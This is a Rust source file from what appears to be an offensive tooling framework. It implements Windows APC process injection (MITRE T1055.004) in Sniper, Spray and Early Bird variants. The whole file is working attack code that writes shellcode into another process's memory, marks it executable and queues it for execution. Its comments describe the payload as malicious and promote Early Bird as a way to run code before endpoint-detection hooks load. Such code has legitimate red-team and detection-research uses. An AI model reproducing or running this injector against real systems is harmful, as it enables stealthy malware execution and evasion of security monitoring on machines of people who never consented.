//! Implementation of **MITRE ATT&CK T1055.004: Asynchronous Procedure Call (APC)**.
//!
//! This module utilizes the Windows APC mechanism to force a target thread to execute
//! malicious code when it enters an "Alertable State". It supports three distinct
//! operational modes:
//! * **Sniper:** Queues the payload to a single thread.
//! * **Spray:** Queues the payload to *all* threads in the target to maximize execution probability.
//! * **Early Bird:** Spawns a suspended process, queues the APC to the main thread, and resumes it.
//!   This is highly effective for evasion as code executes before many EDR hooks are placed.

use std::{
    mem::transmute,
    os::windows::ffi::OsStrExt,
    path::Path,
    ptr::{null, null_mut},
};

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, INVALID_HANDLE_VALUE, PAPCFUNC},
    System::{
        Diagnostics::{
            Debug::WriteProcessMemory,
            ToolHelp::{
                CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
                Thread32Next,
            },
        },
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            CREATE_SUSPENDED, CreateProcessW, OpenProcess, OpenThread, PROCESS_INFORMATION,
            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, QueueUserAPC, ResumeThread,
            STARTF_USESHOWWINDOW, STARTUPINFOW, THREAD_SET_CONTEXT,
        },
    },
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{AsynchronousProcedureCall, Strategy, Technique},
    target::Target,
};

/// The concrete strategy implementation for T1055.004.
#[derive(Default)]
pub(crate) struct T1055_004;

impl Strategy for T1055_004 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        // 1. Unwrap the configuration specific to this technique.
        let method = match technique {
            Technique::T1055_004(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        // 2. Validate Payload: Must be Shellcode.
        let shellcode = match payload {
            Payload::Shellcode { bytes, .. } => bytes,
            _ => {
                return Err(Error::Mismatch {
                    strategy: info.mitre_id,
                    variant: payload.variant_name(),
                });
            }
        };

        // 3. Dispatch based on the specific APC variant selected.
        match method {
            // Standard Injection: Targets an existing running process.
            AsynchronousProcedureCall::Sniper | AsynchronousProcedureCall::Spray => match target {
                Target::Pid(process_id) => {
                    info!(
                        "Method: Standard APC ({})",
                        match method {
                            AsynchronousProcedureCall::Sniper => "Sniper",
                            _ => "Spray",
                        }
                    );
                    apc_injection_standard(*process_id, shellcode, method)
                }
                _ => Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID.",
                    info.mitre_id
                ))),
            },
            // Early Bird: Spawns a new process to inject into.
            AsynchronousProcedureCall::EarlyBird => match target {
                Target::Spawn(target_path) => {
                    info!("Method: Early Bird");
                    apc_injection_early_bird(shellcode, target_path)
                }
                _ => Err(Error::Validation(
                    "EarlyBird APC requires Target::Spawn(path)".into(),
                )),
            },
        }
    }
}

/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
///
/// Ensures that `CloseHandle` is automatically called when the scope ends,
/// preventing resource leaks in the operating system.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// Performs Standard APC Injection on an existing process.
///
/// # Logic
/// 1. **Snapshot**: Enumerate threads in the target process.
/// 2. **Alloc/Write/Protect**: Place shellcode into target memory.
/// 3. **QueueUserAPC**: Queue the shellcode execution routine to the target thread(s).
///
/// # Limitation
/// The target thread executes the APC *only* when it enters an "Alertable State"
/// (e.g., calling `SleepEx`, `WaitForSingleObjectEx`). If the thread never sleeps,
/// the payload never runs. This is why "Spray" is often used.
fn apc_injection_standard(
    process_id: u32,
    shellcode: &[u8],
    method: &AsynchronousProcedureCall,
) -> Result<()> {
    // 1. Enumerate Threads
    let thread_ids = find_target_threads(process_id)?;
    info!("Found {} threads in target process.", thread_ids.len());

    // 2. Open Target Process
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE,
            process_id,
        )
    };

    if process_handle.is_null() {
        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
    }

    let process_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory (RW)
    let remote_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_addr.is_null() {
        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
    }

    // 4. Write Shellcode
    let mut write_len: usize = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_addr,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut write_len,
        )
    };

    if success == 0 || write_len != shellcode.len() {
        return Err(Error::Win32("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Protect Memory (RX)
    let mut old_protection: u32 = 0;

    let success = unsafe {
        VirtualProtectEx(
            process_guard.0,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protection,
        )
    };

    if success == 0 {
        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
    }

    // 6. Queue APC(s)
    let routine_ptr: PAPCFUNC = unsafe { transmute(remote_addr) };

    let mut success_count = 0;

    // Logic:
    // Sniper picks the first thread.
    // Spray targets all of them.
    let threads_to_target = match method {
        AsynchronousProcedureCall::Sniper => &thread_ids[0..1],
        _ => &thread_ids[..],
    };

    for &thread_id in threads_to_target {
        // Specific permission: THREAD_SET_CONTEXT is required for QueueUserAPC.
        let thread_handle = unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id) };
        if !thread_handle.is_null() {
            let _guard = HandleGuard::new(thread_handle);
            if unsafe { QueueUserAPC(routine_ptr, thread_handle, 0) } != 0 {
                success_count += 1;
            }
        }
    }

    if success_count == 0 {
        return Err(Error::Execution(
            "Failed to queue APC to any threads.".into(),
        ));
    }

    info!("APC Queued successfully to {} thread(s).", success_count);
    Ok(())
}

/// Performs **Early Bird** APC Injection.
///
/// # Logic
/// 1. **CreateProcessW (Suspended)**: Start a benign process (e.g., `notepad.exe`) but pause the main thread.
/// 2. **Alloc/Write/Protect**: Place shellcode into the *new* process memory.
/// 3. **QueueUserAPC**: Queue shellcode to the main thread. Since the thread is suspended, the APC is pending.
/// 4. **ResumeThread**: Resuming the thread forces it to immediately process the APC queue before executing the process entry point.
fn apc_injection_early_bird(shellcode: &[u8], target_path: &Path) -> Result<()> {
    let startup_info = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTF_USESHOWWINDOW,
        ..Default::default()
    };
    let mut process_info = PROCESS_INFORMATION::default();
    let path_utf16 = to_utf16_null_terminated(target_path);

    info!("EarlyBird: Spawning suspended process {:?}", target_path);

    // 1. Spawn Suspended
    let success = unsafe {
        CreateProcessW(
            path_utf16.as_ptr(),
            null_mut(),
            null(),
            null(),
            FALSE,
            CREATE_SUSPENDED,
            null(),
            null(),
            &startup_info,
            &mut process_info,
        )
    };

    if success == 0 {
        return Err(Error::Win32("CreateProcessW", unsafe { GetLastError() }));
    }

    // Guards must be created immediately to ensure cleanup if injection fails.
    let process_guard = HandleGuard::new(process_info.hProcess);
    let thread_guard = HandleGuard::new(process_info.hThread);

    // 2. Allocate Memory RW (Read-Write)
    let remote_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_addr.is_null() {
        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
    }

    // 3. Write Shellcode
    let mut write_len: usize = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_addr,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut write_len,
        )
    };

    if success == 0 || write_len != shellcode.len() {
        return Err(Error::Win32("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 4. Protect Memory (RX)
    let mut old_protection: u32 = 0;

    let success = unsafe {
        VirtualProtectEx(
            process_guard.0,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protection,
        )
    };

    if success == 0 {
        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
    }

    // 5. Queue APC
    let routine_ptr: PAPCFUNC = unsafe { transmute(remote_addr) };

    // The APC is queued to the suspended main thread.
    let success = unsafe { QueueUserAPC(routine_ptr, thread_guard.0, 0) };

    if success == 0 {
        return Err(Error::Win32("QueueUserAPC", unsafe { GetLastError() }));
    }

    info!("APC Queued. Resuming thread...");

    // 6. Resume Thread
    // This triggers the APC immediately.
    let suspend_count = unsafe { ResumeThread(thread_guard.0) };

    if suspend_count == u32::MAX {
        return Err(Error::Win32("ResumeThread", unsafe { GetLastError() }));
    }

    Ok(())
}

/// Helper: Snapshots the target process to find all active Thread IDs.
fn find_target_threads(process_id: u32) -> Result<Vec<u32>> {
    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };

    if snapshot_handle == INVALID_HANDLE_VALUE {
        return Err(Error::Win32("CreateToolhelp32Snapshot", unsafe {
            GetLastError()
        }));
    }

    let _snapshot_guard = HandleGuard::new(snapshot_handle);

    let mut thread_entry = THREADENTRY32 {
        dwSize: size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    if unsafe { Thread32First(snapshot_handle, &mut thread_entry) } == FALSE {
        return Err(Error::Win32("Thread32First", unsafe { GetLastError() }));
    }

    let mut thread_ids = Vec::new();

    loop {
        if thread_entry.th32OwnerProcessID == process_id {
            thread_ids.push(thread_entry.th32ThreadID);
        }

        thread_entry.dwSize = size_of::<THREADENTRY32>() as u32;

        if unsafe { Thread32Next(snapshot_handle, &mut thread_entry) } == FALSE {
            break;
        }
    }

    if thread_ids.is_empty() {
        return Err(Error::Execution(
            "No threads found for target process.".to_string(),
        ));
    }

    Ok(thread_ids)
}

/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
    path.as_os_str().encode_wide().chain([0]).collect()
}
